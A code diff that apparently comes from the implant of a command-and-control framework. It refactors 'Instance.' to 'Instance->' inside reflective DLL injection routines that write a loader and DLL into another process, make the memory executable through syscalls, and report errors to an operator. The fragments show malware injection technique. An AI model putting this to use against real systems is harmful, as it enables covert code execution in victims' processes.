@@ -65,7 +65,7 @@ DWORD Inject(
     }
 
     /* check the architecture matches */
-    if ( x64 && Instance.Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ) {
+    if ( x64 && Instance->Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ) {
         PUTS( "The OS is x86!" )
         Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
         goto END;
@@ -77,7 +77,7 @@ DWORD Inject(
         PUTS( "The process target process is x86!" )
         Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
         goto END;
-    } else if ( ! x64 && Instance.Session.OS_Arch == PROCESSOR_ARCHITECTURE_AMD64 && ! IsWow64 ) {
+    } else if ( ! x64 && Instance->Session.OS_Arch == PROCESSOR_ARCHITECTURE_AMD64 && ! IsWow64 ) {
         PUTS( "The process target process is x64!" )
         Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
         goto END;
@@ -185,7 +185,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     BOOL     HasRDll             = FALSE;
     DWORD    ReturnValue         = 0;
     SIZE_T   BytesWritten        = 0;
-    BOOL     x64                 = Instance.Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ? FALSE : TRUE;
+    BOOL     x64                 = Instance->Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ? FALSE : TRUE;
 
     if( ! DllBuffer || ! DllLength || ! hTargetProcess )
     {
@@ -220,7 +220,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     } else {
         PUTS( "The DLL does not have a Reflective Loader defined, using KaynLdr" );
         HasRDll     = FALSE;
-        FullDll     = Instance.Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
+        FullDll     = Instance->Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
         FullDllSize = DllLdrSize + DllLength;
         MemCopy( FullDll, DllLdr, DllLdrSize );
         MemCopy( FullDll + DllLdrSize, DllBuffer, DllLength );
@@ -240,7 +240,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
-                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
                 ReturnValue = NtStatus;
                 goto Cleanup;
             }
@@ -250,7 +250,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         else
         {
             PUTS( "NtAllocateVirtualMemory: Failed to allocate memory for parameters" )
-            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
             ReturnValue = -1;
             goto Cleanup;
         }
@@ -271,7 +271,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
             MemRegionSize = 16384;
             BytesWritten    = 0;
 
-            // NtStatus = Instance.Win32.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
+            // NtStatus = Instance->Win32.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
             if ( MmVirtualProtect( DX_MEM_SYSCALL, hTargetProcess, MemRegion, MemRegionSize, PAGE_EXECUTE_READ ) )
             {
                 ctx->Parameter = MemParamsBuffer;
@@ -299,7 +299,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         else
         {
             PRINTF( "NtWriteVirtualMemory: Failed to write memory for library [%x]\n", NtStatus )
-            PackageTransmitError( 0x1, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
+            PackageTransmitError( 0x1, Instance->Win32.RtlNtStatusToDosError( NtStatus ) );
             ReturnValue = NtStatus;
             goto Cleanup;
         }
@@ -328,9 +328,9 @@ DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWO
     DWORD               Result      = 0;
 
     if ( GetPeArch( DllBuffer ) == PROCESS_ARCH_X86 ) // check if dll is x64
-        SpawnProc = Instance.Config.Process.Spawn86;
+        SpawnProc = Instance->Config.Process.Spawn86;
     else
-        SpawnProc = Instance.Config.Process.Spawn64;
+        SpawnProc = Instance->Config.Process.Spawn64;
 
     /* Meh this is the default */
     Result = ERROR_INJECT_FAILED_TO_SPAWN_TARGET_PROCESS;
